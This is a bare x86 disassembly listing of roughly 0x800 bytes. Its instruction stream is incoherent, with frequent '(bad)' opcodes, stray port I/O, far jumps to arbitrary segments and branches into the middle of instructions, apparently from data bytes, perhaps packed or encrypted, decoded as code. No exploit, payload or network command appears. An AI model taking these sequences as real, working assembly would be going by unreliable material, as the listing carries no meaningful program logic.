  4183c6:	faddp  st(2),st
  4183c8:	cmc    
  4183c9:	popf   
  4183ca:	sub    bl,dl
  4183cc:	xchg   esp,eax
  4183cd:	pusha  
  4183ce:	cdq    
  4183cf:	and    eax,0xe04ceb8d
  4183d4:	or     ebx,edi
  4183d6:	pop    ebp
  4183d7:	and    si,cx
  4183da:	jno    0x418389
  4183dc:	shl    ah,1
  4183de:	mov    ah,0x99
  4183e0:	cld    
  4183e1:	in     al,0xa3
  4183e3:	in     eax,0xba
  4183e5:	jge    0x41838e
  4183e7:	sar    DWORD PTR [eax-0x45],cl
  4183ea:	fidiv  WORD PTR [esi+0x22f3acb7]
  4183f0:	fidiv  DWORD PTR [edx-0x78]
  4183f3:	sub    eax,DWORD PTR [esi-0x3c166572]
  4183f9:	rcl    BYTE PTR [edi],0x81
  4183fc:	rol    edi,0xd9
  4183ff:	cmp    ah,BYTE PTR ss:[ecx*2+0x6a27239a]
  418407:	jl     0x418433
  418409:	cld    
  41840a:	test   eax,0x9df72a5c
  41840f:	dec    ebx
  418410:	adc    eax,0x21ce1ccf
  418415:	stos   DWORD PTR es:[edi],eax
  418416:	(bad)  
  418417:	cs xchg ebp,eax
  418419:	push   ss
  41841a:	add    BYTE PTR [ecx-0x7f8ef652],cl
  418420:	sbb    BYTE PTR [edx],0x85
  418423:	clc    
  418424:	rol    DWORD PTR [esi+0x6e],0xb7
  418428:	jo     0x4183d8
  41842a:	ss iret 
  41842c:	push   cs
  41842d:	sub    DWORD PTR [ebx-0x41ce35ed],0x63
  418434:	xlat   BYTE PTR ds:[ebx]
  418435:	call   0xd29e:0x50c6b5cf
  41843c:	bound  ebx,QWORD PTR [esi]
  41843e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41843f:	inc    esp
  418440:	mov    WORD PTR [edi-0x75b8f3b4],?
  418446:	jno    0x4183d7
  418448:	mov    dh,0xf9
  41844a:	pushf  
  41844b:	imul   ebp,DWORD PTR [ebx],0xffffffaf
  41844e:	ss inc esp
  418450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418451:	(bad)  
  418452:	shr    DWORD PTR [ecx],1
  418454:	or     eax,0xb9943b4d
  418459:	ja     0x41848d
  41845b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41845c:	mov    ds:0x8eec18cf,al
  418461:	rcl    ecx,0x95
  418464:	and    ebx,ebp
  418466:	push   cs
  418467:	aam    0x5d
  418469:	pop    ebp
  41846a:	lahf   
  41846b:	in     al,dx
  41846c:	aas    
  41846d:	pop    esp
  41846e:	shl    bl,1
  418470:	ficomp DWORD PTR [esi+esi*8-0x141b0369]
  418477:	jmp    0x88b15a57
  41847c:	arpl   WORD PTR [esi-0x71],dx
  41847f:	add    eax,0xb936851e
  418484:	push   cs
  418485:	(bad)  
  418486:	push   ebx
  418487:	mov    ebx,0x8a7d05f6
  41848d:	(bad)  
  41848e:	xor    DWORD PTR [edx],eax
  418490:	and    eax,0x6891157c
  418495:	xor    BYTE PTR [ecx+0xc],0xf3
  418499:	in     eax,0x9a
  41849b:	js     0x4184a9
  41849d:	test   DWORD PTR [esi-0x2c],ecx
  4184a0:	and    al,0xb4
  4184a2:	ror    BYTE PTR [edi+esi*2+0x39],cl
  4184a6:	jne    0x41843b
  4184a8:	fisubr DWORD PTR [eax]
  4184aa:	sub    eax,0xf5cac5b3
  4184af:	outs   dx,DWORD PTR ds:[esi]
  4184b0:	xor    ecx,edi
  4184b2:	mov    eax,0xa61f38de
  4184b7:	xor    edi,DWORD PTR [esi+eax*8-0x7125255e]
  4184be:	push   esi
  4184bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184c0:	sbb    esp,DWORD PTR [ebp-0x77]
  4184c3:	fcomp  QWORD PTR [edi]
  4184c5:	fadd   QWORD PTR [eax+0x300b6db5]
  4184cb:	xchg   esp,eax
  4184cc:	inc    edi
  4184cd:	pop    ebx
  4184ce:	lahf   
  4184cf:	adc    eax,0x7d719fd0
  4184d4:	jg     0x4184a9
  4184d6:	inc    edi
  4184d7:	shl    BYTE PTR [esi+0x12554a4c],0x1e
  4184de:	stos   BYTE PTR es:[edi],al
  4184df:	ror    DWORD PTR ds:0x63080fdd,cl
  4184e5:	rcr    BYTE PTR es:[esi-0x26],1
  4184e9:	dec    edx
  4184ea:	mov    al,ds:0xd3cb42e
  4184ef:	gs je  0x418518
  4184f2:	jne    0x4184c0
  4184f4:	(bad)  
  4184f5:	jns    0x418485
  4184f7:	shl    DWORD PTR [ecx],1
  4184f9:	sbb    ebp,DWORD PTR ss:[ecx]
  4184fc:	add    DWORD PTR [eax+0x71],ecx
  4184ff:	mov    bh,BYTE PTR [ebx-0x23]
  418502:	push   eax
  418503:	add    ah,BYTE PTR [esp+eiz*2-0x5b]
  418507:	shr    DWORD PTR [esi-0x78],cl
  41850a:	push   esi
  41850b:	mov    edi,0x53c813e0
  418510:	ficomp DWORD PTR [ebp-0x39]
  418513:	mov    ah,0x52
  418515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418516:	outs   dx,DWORD PTR ds:[esi]
  418517:	cs mov esi,edx
  41851a:	xor    DWORD PTR [edi+0x2d610e6f],edx
  418520:	mov    bh,0x92
  418522:	jno    0x4184d0
  418524:	sbb    DWORD PTR [edx-0x8],edi
  418527:	pop    esi
  418528:	mov    edx,0xad3be19
  41852d:	dec    ecx
  41852e:	(bad)  
  41852f:	dec    eax
  418530:	out    0x3d,eax
  418532:	daa    
  418533:	xchg   edx,eax
  418534:	shr    DWORD PTR [ebx+0xe970e45],cl
  41853a:	xchg   ecx,eax
  41853b:	test   DWORD PTR [edx-0x53],esp
  41853e:	cmp    al,0x61
  418540:	mov    ch,0xca
  418542:	nop
  418543:	mov    eax,0xd653225
  418548:	(bad)  
  418549:	and    ah,bl
  41854b:	adc    al,0x38
  41854d:	(bad)  
  41854e:	es jmp 0x4184f4
  418551:	sub    eax,0xd6aa077c
  418556:	pop    esp
  418557:	lock sub BYTE PTR [ebx-0x92209fb],bh
  41855e:	push   ebx
  41855f:	adc    al,0x5c
  418561:	imul   esi,eax,0x6a386245
  418567:	push   ebx
  418568:	jns    0x4185e7
  41856a:	icebp  
  41856b:	dec    ecx
  41856c:	pop    esi
  41856d:	mov    WORD PTR [edi+0x3a],?
  418570:	fistp  DWORD PTR [ebp-0x430c888f]
  418576:	ins    BYTE PTR es:[edi],dx
  418577:	jbe    0x418560
  418579:	or     DWORD PTR [ecx-0x2c],ebx
  41857c:	adc    DWORD PTR [ebp+0x7c4bd00e],esi
  418582:	repz rcr edx,0x69
  418586:	ss int3 
  418588:	adc    BYTE PTR fs:[ebx+0x5bee9a60],bh
  41858f:	aam    0x3d
  418591:	or     edi,DWORD PTR [ebx-0x6c]
  418594:	sbb    bh,ah
  418596:	mov    dl,0xce
  418598:	ficomp DWORD PTR [esi+esi*1]
  41859b:	xchg   ebp,ebp
  41859d:	mov    esi,DWORD PTR [ebp+0x739b6ea1]
  4185a3:	pop    eax
  4185a4:	pop    edx
  4185a5:	pop    ecx
  4185a6:	test   eax,0xbed8e8aa
  4185ab:	aaa    
  4185ac:	(bad)  [ebp+0x51]
  4185af:	cmp    cl,BYTE PTR [ecx]
  4185b1:	sub    ecx,DWORD PTR [esi]
  4185b3:	mov    dl,0x7a
  4185b5:	mov    edx,0xca00d31f
  4185ba:	js     0x41861a
  4185bc:	sbb    ch,BYTE PTR [ebp-0x54]
  4185bf:	sti    
  4185c0:	dec    ecx
  4185c1:	je     0x418634
  4185c3:	mov    cl,0xf6
  4185c5:	aas    
  4185c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185c7:	sbb    al,BYTE PTR [edx]
  4185c9:	pop    ds
  4185ca:	das    
  4185cb:	aam    0x4b
  4185cd:	out    0x17,al
  4185cf:	xchg   esp,eax
  4185d0:	(bad)  
  4185d1:	dec    ebx
  4185d2:	xor    BYTE PTR [ecx+ebx*8+0x2bbefe77],bl
  4185d9:	sbb    esp,edi
  4185db:	or     eax,0xd4665a0e
  4185e0:	mov    dh,0x83
  4185e2:	lods   eax,DWORD PTR ds:[esi]
  4185e3:	mov    edi,0xe13af3ba
  4185e8:	fidivr DWORD PTR [edx-0x30f73204]
  4185ee:	enter  0x478,0xd6
  4185f2:	mov    ebp,0xa6bc0b3e
  4185f7:	xor    ecx,esp
  4185f9:	mov    ?,WORD PTR [ecx+0x1b]
  4185fc:	call   0x30022dc6
  418601:	inc    esi
  418602:	mov    ch,0xd3
  418604:	aas    
  418605:	outs   dx,DWORD PTR ds:[esi]
  418606:	sub    eax,0xf023e945
  41860b:	jo     0x4185e4
  41860d:	retf   0x14c8
  418610:	jo     0x418678
  418612:	and    eax,0x7bfd4f2c
  418617:	shl    DWORD PTR [edx+0x41],cl
  41861a:	jmp    0xd946:0xb5c4cc95
  418621:	adc    BYTE PTR [edi],bh
  418623:	sahf   
  418624:	dec    esi
  418625:	mov    al,BYTE PTR [esi+0x3d]
  418628:	sbb    bl,bh
  41862a:	js     0x4185ff
  41862c:	pop    ecx
  41862d:	adc    eax,0xa781b48
  418632:	into   
  418633:	push   eax
  418634:	fisubr DWORD PTR [edx-0x3f627569]
  41863a:	scas   eax,DWORD PTR es:[edi]
  41863b:	cli    
  41863c:	ret    
  41863d:	aad    0x5c
  41863f:	std    
  418640:	icebp  
  418641:	mov    ebx,0xb655c296
  418646:	inc    esp
  418647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418648:	fcmovb st,st(7)
  41864a:	push   0xb7fc5208
  41864f:	sbb    eax,0x9c6cc756
  418654:	mov    al,0x63
  418656:	mov    cl,0x37
  418658:	pop    ss
  418659:	(bad)  
  41865b:	icebp  
  41865c:	loop   0x41860d
  41865e:	jno    0x4186b6
  418660:	xchg   esi,eax
  418661:	inc    eax
  418662:	cmp    BYTE PTR [edx-0x2bfffcde],al
  418668:	push   0x4e
  41866a:	retf   0x84ce
  41866d:	test   eax,0x20da8b2c
  418672:	int    0x72
  418674:	dec    eax
  418675:	cmp    BYTE PTR [esi-0x10],ah
  418678:	jbe    0x418660
  41867a:	stos   DWORD PTR es:[edi],eax
  41867b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41867c:	adc    DWORD PTR [edx-0x307c39f9],edi
  418682:	xchg   esp,eax
  418683:	xchg   esi,eax
  418684:	pop    edx
  418685:	cs jne 0x4186d5
  418688:	stos   BYTE PTR es:[edi],al
  418689:	xor    dl,BYTE PTR [ecx+0x24]
  41868c:	(bad)  
  41868e:	test   al,0x3b
  418690:	pop    ebp
  418691:	imul   esp,DWORD PTR ds:0x7a5c7187,0x5d141d3
  41869b:	dec    esp
  41869c:	or     DWORD PTR [edi],ebp
  41869e:	mov    dl,bh
  4186a0:	adc    esi,DWORD PTR fs:[eax+0x3c]
  4186a4:	sti    
  4186a5:	imul   esi,DWORD PTR [ebp-0x72335900],0xffffffc2
  4186ac:	mov    dl,0xcb
  4186ae:	hlt    
  4186af:	cld    
  4186b0:	out    0xe5,al
  4186b2:	out    dx,eax
  4186b3:	shl    BYTE PTR [edx],0x3c
  4186b6:	jmp    0x41865b
  4186b8:	aad    0xba
  4186ba:	jnp    0x418702
  4186bc:	retf   
  4186bd:	dec    esp
  4186be:	cmp    esi,0x6a
  4186c1:	(bad)  
  4186c2:	aas    
  4186c3:	adc    esi,DWORD PTR [eax]
  4186c5:	ficom  WORD PTR [edx-0x5a]
  4186c8:	jne    0x418702
  4186ca:	ss retf 0xd8a3
  4186ce:	test   eax,0x3de373d3
  4186d3:	pop    es
  4186d4:	sub    eax,0x13647198
  4186d9:	inc    cl
  4186db:	xchg   BYTE PTR [edx+0x187b8a1],ch
  4186e1:	dec    ecx
  4186e2:	jno    0x4186a7
  4186e4:	mov    al,0xa3
  4186e6:	adc    eax,0x7d543e2b
  4186eb:	pop    ds
  4186ec:	fucompp 
  4186ee:	sbb    DWORD PTR [ebx],eax
  4186f0:	lahf   
  4186f1:	sub    BYTE PTR [eax+0xbd65f8a],dh
  4186f7:	jns    0x418744
  4186f9:	sub    eax,0x76c090
  4186fe:	jno    0x41873d
  418700:	xchg   esi,eax
  418701:	xor    al,0x26
  418703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418704:	and    BYTE PTR [ecx],0x30
  418707:	mov    esi,0x937de52e
  41870c:	ret    0xcd96
  41870f:	xchg   BYTE PTR [ecx+0x42],bl
  418712:	push   ebx
  418713:	cwde   
  418714:	pop    eax
  418715:	jmp    0x123e:0xa1da6c59
  41871c:	int    0xb5
  41871e:	stos   BYTE PTR es:[edi],al
  41871f:	jmp    0x41873f
  418721:	pusha  
  418722:	mov    edx,ebx
  418724:	out    dx,eax
  418725:	or     BYTE PTR [ebp+0x27],cl
  418728:	repnz sti 
  41872a:	add    al,0x26
  41872c:	adc    BYTE PTR [ebx-0x5d852c88],0xb3
  418733:	fisttp DWORD PTR [edi]
  418735:	mov    edi,0xc8265be0
  41873a:	mov    edi,0x112e14ac
  41873f:	mov    ds:0x6698292f,al
  418744:	retf   
  418745:	bound  esi,QWORD PTR [ebp-0x16]
  418748:	(bad)  
  418749:	div    BYTE PTR [edx-0x3e]
  41874c:	cmp    eax,ebx
  41874e:	fisub  DWORD PTR [ebx]
  418750:	adc    dl,dh
  418752:	sub    BYTE PTR [ebx-0x4a],bh
  418755:	test   BYTE PTR [edx-0x72],0x39
  418759:	cmc    
  41875a:	jo     0x418774
  41875c:	and    DWORD PTR [edi-0x72],ebp
  41875f:	test   eax,0xd4556758
  418764:	retf   
  418765:	ins    BYTE PTR es:[edi],dx
  418766:	inc    esp
  418767:	outs   dx,DWORD PTR ds:[esi]
  418768:	pop    es
  418769:	and    al,0x9a
  41876b:	pop    ecx
  41876c:	int3   
  41876d:	leave  
  41876e:	hlt    
  41876f:	adc    eax,0xcd7056d2
  418774:	xchg   esi,eax
  418775:	aam    0x6d
  418777:	call   0x57f6:0x4b710d72
  41877e:	pop    ebp
  41877f:	(bad)  
  418780:	jae    0x41875e
  418782:	outs   dx,DWORD PTR ds:[esi]
  418783:	(bad)  
  418785:	jmp    0xf1e8e3ea
  41878a:	push   eax
  41878b:	push   0xd
  41878d:	(bad)  
  41878e:	das    
  41878f:	in     al,dx
  418790:	sbb    al,0x3c
  418792:	rcr    DWORD PTR [esi+edx*4+0x65177149],1
  418799:	jae    0x418725
  41879b:	adc    DWORD PTR [ecx+edx*8-0x24],esi
  41879f:	rcl    DWORD PTR [edi],cl
  4187a1:	bound  ebx,QWORD PTR [ebp+0x6]
  4187a4:	inc    edx
  4187a5:	(bad)  
  4187a6:	mov    ecx,0xa6ecdad6
  4187ab:	popf   
  4187ac:	jnp    0x41880c
  4187ae:	ins    DWORD PTR es:[edi],dx
  4187af:	int    0x3e
  4187b1:	jp     0x4187d1
  4187b3:	add    al,0x8a
  4187b5:	leave  
  4187b6:	es aam 0x59
  4187b9:	sbb    BYTE PTR [esi+0x44],dl
  4187bc:	lds    ebx,FWORD PTR [ebx]
  4187be:	jbe    0x418771
  4187c0:	fisub  DWORD PTR [ecx-0xa]
  4187c3:	pusha  
  4187c4:	int3   
  4187c5:	shl    DWORD PTR [ecx-0x35],1
  4187c8:	mov    ds:0x516cdfd6,eax
  4187cd:	ror    BYTE PTR [ecx+0x73],0x22
  4187d1:	test   BYTE PTR [ecx+0x67],dh
  4187d4:	mov    ch,0x68
  4187d6:	stc    
  4187d7:	adc    ch,ah
  4187d9:	and    eax,0x2cfdc62e
  4187de:	lds    esp,FWORD PTR [eax-0x526854e6]
  4187e4:	inc    edx
  4187e5:	push   ebx
  4187e6:	jno    0x4187a3
  4187e8:	ficom  WORD PTR [ecx-0x66b70554]
  4187ee:	loope  0x4187d3
  4187f0:	jl     0x4187c8
  4187f2:	xlat   BYTE PTR ds:[ebx]
  4187f3:	fisttp DWORD PTR [ebx]
  4187f5:	lahf   
  4187f6:	pop    ds
  4187f7:	in     eax,dx
  4187f8:	sub    DWORD PTR [eax],ebx
  4187fa:	outs   dx,BYTE PTR ds:[esi]
  4187fb:	pop    eax
  4187fc:	arpl   WORD PTR [esi-0x22194913],ax
  418802:	imul   ecx,DWORD PTR [esi],0xffffffc9
  418805:	(bad)  
  418806:	rcl    DWORD PTR [edx],cl
  418808:	loopne 0x41881c
  41880a:	mov    ?,WORD PTR [eax-0x69]
  41880d:	cld    
  41880e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41880f:	cmc    
  418810:	sub    al,BYTE PTR [eax+0x2f]
  418813:	fistp  DWORD PTR [edi+ebp*1-0x58952c53]
  41881a:	and    ch,ah
  41881c:	mov    BYTE PTR [eax*2+0x3a3117d2],bh
  418823:	pop    ds
  418824:	lahf   
  418825:	jnp    0x4187d8
  418827:	rol    DWORD PTR [ebp+0x1397717f],cl
  41882d:	cmp    bh,0xa8
  418830:	ficom  WORD PTR [ecx]
  418832:	ret    0x65d3
  418835:	push   edi
  418836:	sbb    eax,0x4013f278
  41883b:	dec    esp
  41883c:	fiadd  DWORD PTR [edx-0xc]
  41883f:	jecxz  0x41888f
  418841:	cmp    dh,BYTE PTR [eax]
  418843:	add    eax,0xd22fd4ed
  418848:	jne    0x41881a
  41884a:	(bad)  
  41884b:	in     eax,dx
  41884c:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41884e:	xor    al,0x58
  418850:	(bad)  
  418852:	dec    edx
  418853:	add    dl,BYTE PTR [ebp+0x6ada2249]
  418859:	fdivr  QWORD PTR [ebx+0x1eeefbd1]
  41885f:	mov    cl,0x8a
  418861:	mov    cl,0x31
  418863:	aas    
  418864:	add    eax,0x389b54e0
  418869:	push   ss
  41886a:	mov    cl,0x48
  41886c:	push   ecx
  41886d:	mov    ds:0xd5fe0359,al
  418872:	xchg   esi,eax
  418873:	dec    esp
  418874:	push   edx
  418875:	or     DWORD PTR [ebx],esi
  418877:	lea    ebp,[esi+0x37b254f2]
  41887d:	mov    dh,0xb1
  41887f:	imul   BYTE PTR [esp+edx*8]
  418882:	inc    eax
  418883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418884:	push   ss
  418885:	rcr    DWORD PTR [edx+0x611da081],cl
  41888b:	test   BYTE PTR [ebx+0x56],dl
  41888e:	and    BYTE PTR [edi-0x5b],dh
  418891:	xor    al,0x70
  418893:	retf   0x7530
  418896:	push   ecx
  418897:	shl    DWORD PTR [edi],0xc
  41889a:	xchg   ecx,eax
  41889b:	mov    ?,WORD PTR [edx+0xed38564]
  4188a1:	out    0x5c,al
  4188a3:	test   BYTE PTR [ebx],dl
  4188a5:	xchg   edi,eax
  4188a6:	adc    eax,0x6fe9f9b9
  4188ab:	cdq    
  4188ac:	ficom  DWORD PTR [edx-0x63]
  4188af:	inc    ebx
  4188b0:	fisttp QWORD PTR [ebp-0x4f744239]
  4188b6:	std    
  4188b7:	push   ecx
  4188b8:	xchg   DWORD PTR [edi+eiz*8+0x30],edx
  4188bc:	icebp  
  4188bd:	rcl    BYTE PTR [eax],0xee
  4188c0:	dec    ecx
  4188c1:	out    0x27,al
  4188c3:	inc    esp
  4188c4:	retf   
  4188c5:	cmp    edx,edi
  4188c7:	cmp    esi,DWORD PTR [edx]
  4188c9:	ss xchg edi,eax
  4188cb:	xlat   BYTE PTR ds:[ebx]
  4188cc:	jae    0x4188cd
  4188ce:	add    eax,0x32bee6d4
  4188d3:	in     eax,dx
  4188d4:	jnp    0x418903
  4188d6:	mov    dh,0x1c
  4188d8:	ficom  DWORD PTR [esi-0x28ed0154]
  4188de:	mov    al,ds:0xfed5d088
  4188e3:	or     al,0xad
  4188e5:	push   edx
  4188e6:	jns    0x418872
  4188e8:	lock adc DWORD PTR [esi+0x56],edx
  4188ec:	fisubr DWORD PTR [ecx]
  4188ee:	ret    
  4188ef:	sub    al,0x4d
  4188f1:	sub    cl,0x1e
  4188f4:	sahf   
  4188f5:	retf   
  4188f6:	aam    0x78
  4188f8:	mov    eax,es
  4188fa:	push   0xffffff98
  4188fc:	xchg   DWORD PTR [ebx],esi
  4188fe:	aaa    
  4188ff:	in     al,dx
  418900:	cmp    bl,dh
  418902:	push   edi
  418903:	arpl   WORD PTR [ebp+edi*8+0x1bda94c5],di
  41890a:	out    dx,eax
  41890b:	jno    0x41895b
  41890d:	nop
  41890e:	stos   BYTE PTR es:[edi],al
  41890f:	rcr    DWORD PTR [edx-0x1],cl
  418912:	cmp    DWORD PTR [edi],0x986f6028
  418918:	les    si,DWORD PTR [ecx-0x7d]
  41891c:	test   dl,ch
  41891e:	pop    esp
  41891f:	fnstenv [edx]
  418921:	or     al,0xc
  418923:	aam    0x17
  418925:	fwait
  418926:	cs repz pop ebx
  418929:	leave  
  41892a:	fnstenv [ebx]
  41892c:	out    0x64,al
  41892e:	jno    0x418963
  418930:	out    dx,al
  418931:	dec    esp
  418932:	out    0xb,eax
  418934:	mov    esi,0xded4178d
  418939:	arpl   dx,cx
  41893b:	cli    
  41893c:	bound  ebx,QWORD PTR [edi-0x62]
  41893f:	jne    0x41891b
  418941:	repz in al,0xcb
  418944:	xor    cl,bh
  418946:	xor    ah,BYTE PTR [esi-0x4e26302b]
  41894c:	(bad)  
  41894d:	retf   0x9419
  418950:	aas    
  418951:	cs daa 
  418953:	pusha  
  418954:	fisub  DWORD PTR [ebx]
  418956:	xchg   ebp,eax
  418957:	cwde   
  418958:	add    ebp,DWORD PTR [edx-0x2a0bb098]
  41895e:	mov    WORD PTR ds:[ebx+0x6543a385],ds
  418965:	ss cmc 
  418967:	mov    ecx,0x5c67c9e8
  41896c:	jnp    0x418975
  41896e:	mov    bh,0x38
  418970:	(bad)  
  418972:	out    dx,eax
  418973:	ret    0xf11d
  418976:	adc    edx,0xc24855ee
  41897c:	out    0x4b,al
  41897e:	lods   al,BYTE PTR ds:[esi]
  41897f:	out    dx,eax
  418980:	pop    es
  418981:	arpl   WORD PTR [edx+0x79],bp
  418984:	dec    edx
  418985:	stos   DWORD PTR es:[edi],eax
  418986:	mov    gs,WORD PTR [ebx+0x2a]
  418989:	push   0x22
  41898b:	dec    ebx
  41898c:	ins    BYTE PTR es:[edi],dx
  41898d:	shl    DWORD PTR [edi-0x675097f0],cl
  418993:	mov    gs,WORD PTR [edx]
  418995:	mov    DWORD PTR ds:0x7154427b,ebx
  41899b:	mov    eax,0x2c9b32cd
  4189a0:	mov    ebx,0x2bd3ce58
  4189a5:	div    BYTE PTR [edx+0x4d8b73a7]
  4189ab:	jg     0x418984
  4189ad:	out    0x37,eax
  4189af:	push   cs
  4189b0:	(bad)  
  4189b1:	and    eax,0xd92a22ea
  4189b6:	xchg   esp,eax
  4189b7:	js     0x418a24
  4189b9:	(bad)  
  4189ba:	pushf  
  4189bb:	add    DWORD PTR [ebx-0x28],edi
  4189be:	cmp    eax,0x7138866d
  4189c3:	xchg   bl,al
  4189c5:	and    esi,edi
  4189c7:	in     al,dx
  4189c8:	int    0x92
  4189ca:	jle    0x41899f
  4189cc:	test   al,0x56
  4189ce:	shl    BYTE PTR ds:0xe25bce95,0xc5
  4189d5:	test   BYTE PTR [edx+0x63ba1e4a],bh
  4189db:	or     cl,ah
  4189dd:	push   es
  4189de:	sbb    dh,BYTE PTR [esp+ecx*1+0x6e28ff83]
  4189e5:	mov    gs,WORD PTR [edx]
  4189e7:	sub    edx,ebx
  4189e9:	mov    al,0x6a
  4189eb:	ds cmp eax,0x9fa3ee10
  4189f1:	cmp    edx,DWORD PTR [esp+ebp*4-0x29]
  4189f5:	inc    ebp
  4189f6:	xchg   ecx,eax
  4189f7:	imul   ebx,edx,0xffffffda
  4189fa:	adc    eax,0xbc58ea89
  4189ff:	add    ah,BYTE PTR [ebx]
  418a01:	aad    0x3d
  418a03:	jne    0x4189b0
  418a05:	shl    BYTE PTR [ebx+0x5a0a6d7a],1
  418a0b:	lock fnstcw WORD PTR [esi-0xa39a764]
  418a12:	shl    BYTE PTR [ebx],cl
  418a14:	jp     0x4189f3
  418a16:	pop    edx
  418a17:	pop    ebp
  418a18:	dec    ecx
  418a19:	(bad)  
  418a1a:	mov    al,ds:0x1bf80f34
  418a1f:	ret    0x2923
  418a22:	jno    0x418a54
  418a24:	jle    0x418a6e
  418a26:	dec    eax
  418a27:	pushf  
  418a28:	and    eax,0xf7d42c83
  418a2d:	(bad)  
  418a2e:	shr    BYTE PTR es:[edx+ebx*4],cl
  418a32:	test   eax,0xdc8ada68
  418a37:	jp     0x418a51
  418a39:	pop    ss
  418a3a:	xor    BYTE PTR [edi],al
  418a3c:	inc    eax
  418a3d:	(bad)  
  418a3e:	and    al,0x51
  418a40:	or     DWORD PTR [esi+0x33c552ef],ecx
  418a46:	push   ebp
  418a47:	jo     0x418a3f
  418a49:	and    BYTE PTR [ebp-0x63],ch
  418a4c:	push   esp
  418a4d:	clc    
  418a4e:	lock fisubr DWORD PTR [ebx]
  418a51:	mov    ds:0x87e0cd03,al
  418a56:	pop    ss
  418a57:	test   BYTE PTR [edi],cl
  418a59:	jae    0x418a1e
  418a5b:	mov    al,ds:0xec3258e1
  418a60:	ret    0x5454
  418a63:	cmc    
  418a64:	inc    edi
  418a65:	xchg   esi,eax
  418a66:	and    ah,BYTE PTR [ecx]
  418a68:	push   edx
  418a69:	ss fs inc edx
  418a6c:	ror    BYTE PTR [esi+0x7c0795ac],0x71
  418a73:	int    0x7c
  418a75:	xchg   edi,eax
  418a76:	jecxz  0x418a2d
  418a78:	or     al,0xf6
  418a7a:	push   ecx
  418a7b:	and    bh,BYTE PTR [ecx]
  418a7d:	mov    edx,0x2d26d3b7
  418a82:	xchg   ebx,eax
  418a83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a84:	mov    al,ds:0xedd43b47
  418a89:	in     eax,0xcb
  418a8b:	cli    
  418a8c:	test   al,0x49
  418a8e:	ds imul ebx,edx,0x1cc02c4b
  418a95:	dec    esp
  418a96:	pop    ecx
  418a97:	push   esp
  418a98:	dec    ebx
  418a99:	(bad)  
  418a9a:	sbb    BYTE PTR [esi],0x7c
  418a9d:	into   
  418a9e:	sbb    al,0xf8
  418aa0:	dec    edx
  418aa1:	jle    0x418b06
  418aa3:	push   eax
  418aa4:	cmc    
  418aa5:	iret   
  418aa6:	sbb    edx,DWORD PTR [eax+esi*4]
  418aa9:	mov    edx,0xd67e9714
  418aae:	push   ds
  418aaf:	retf   
  418ab0:	mov    ecx,0xcf0211a0
  418ab5:	sti    
  418ab6:	jo     0x418af2
  418ab8:	popa   
  418ab9:	mov    dh,0xc7
  418abb:	dec    ebx
  418abc:	(bad)  
  418abd:	scas   eax,DWORD PTR es:[edi]
  418abe:	(bad)  
  418abf:	aam    0x5d
  418ac1:	shr    BYTE PTR [eax],0xc3
  418ac4:	js     0x418b2c
  418ac6:	sub    al,0xf7
  418ac8:	ficomp DWORD PTR [edi+0x48]
  418acb:	and    al,0x1b
  418acd:	push   0xffffffe3
  418acf:	cmp    ebp,ebx
  418ad1:	icebp  
  418ad2:	gs aam 0x34
  418ad5:	not    DWORD PTR [ebp+eiz*8+0x5d]
  418ad9:	clc    
  418ada:	jns    0x418aab
  418adc:	fidivr DWORD PTR [ebx-0x18]
  418adf:	dec    edi
  418ae0:	jmp    0xe8db65c6
  418ae5:	scas   eax,DWORD PTR es:[edi]
  418ae6:	fs pop edx
  418ae8:	imul   edx,esi,0xffffff85
  418aeb:	fidivr DWORD PTR [eax-0x25f49400]
  418af1:	or     ah,BYTE PTR [edx-0x32ad2b6c]
  418af7:	scas   al,BYTE PTR es:[edi]
  418af8:	mov    esi,0x63832fd6
  418afd:	dec    edi
  418afe:	ror    BYTE PTR [ebp-0x688e5646],cl
  418b04:	(bad)  
  418b05:	sahf   
  418b06:	imul   esi,esp,0xd2aada0b
  418b0c:	xchg   BYTE PTR [ebp-0x46],dh
  418b0f:	(bad)  
  418b11:	mov    edi,0xfb92f7be
  418b16:	jo     0x418b41
  418b18:	in     al,0x42
  418b1a:	xor    ebx,DWORD PTR [ebx]
  418b1c:	mov    cl,0x7a
  418b1e:	arpl   sp,dx
  418b20:	inc    eax
  418b21:	repz icebp 
  418b23:	hlt    
  418b24:	mov    edx,0xd3c96a44
  418b29:	jge    0x418b85
  418b2b:	mov    ebx,0xc29109dc
  418b30:	pushf  
  418b31:	in     al,0x48
  418b33:	aam    0xa2
  418b35:	out    dx,eax
  418b36:	add    DWORD PTR [eax-0x8],edx
  418b39:	push   ebx
  418b3a:	xchg   esp,eax
  418b3b:	mov    ch,0xd1
  418b3d:	push   ecx
  418b3e:	add    eax,0x3c56258b
  418b43:	dec    esp
  418b44:	or     bh,bh
  418b46:	test   al,0xd3
  418b48:	mov    eax,ds:0x73286059
  418b4d:	mov    bh,0x3c
  418b4f:	sub    al,0xc7
  418b51:	push   esp
  418b52:	or     al,0x5b
  418b54:	fldenv [esi]
  418b56:	sti    
  418b57:	sar    BYTE PTR [esi+0x66f67d6d],0xd3
  418b5e:	shl    ch,0x4a
  418b61:	aas    
  418b62:	jl     0x418b09
  418b64:	out    0x53,al
  418b66:	push   ds
  418b67:	jl     0x418b03
  418b69:	sub    eax,0x4b6625df
  418b6e:	jno    0x418b91
  418b70:	mov    DWORD PTR [esp+ebx*2],edi
  418b73:	dec    ebx
  418b74:	jnp    0x418bf0
  418b76:	outs   dx,DWORD PTR ds:[esi]
  418b77:	aam    0x13
  418b79:	inc    edi
  418b7a:	sub    esi,ebx
  418b7c:	pop    ebp
  418b7d:	daa    
  418b7e:	mov    fs,WORD PTR [edx+ebx*8+0x30]
  418b82:	or     ch,BYTE PTR [eax+0x58]
  418b85:	mov    cs,esp
  418b87:	mov    esi,0x830ed425
  418b8c:	mov    dl,0xe2
